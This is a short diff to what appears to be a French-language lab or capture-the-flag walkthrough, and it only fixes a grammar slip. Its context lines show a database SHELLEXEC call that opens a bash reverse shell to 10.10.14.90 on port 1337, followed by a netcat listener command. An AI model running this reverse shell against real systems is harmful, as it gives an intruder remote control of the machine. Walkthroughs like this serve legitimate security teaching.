@@ -71,7 +71,7 @@ $$;
 CALL SHELLEXEC('bash -i &>/dev/tcp/10.10.14.90/1337 0>&1 &')
 ```
 
-Maintenant démarrer listenner avec netcat :
+Maintenant démarrer un listenner avec netcat :
 
 ```sh
 nc -nvlp 1337
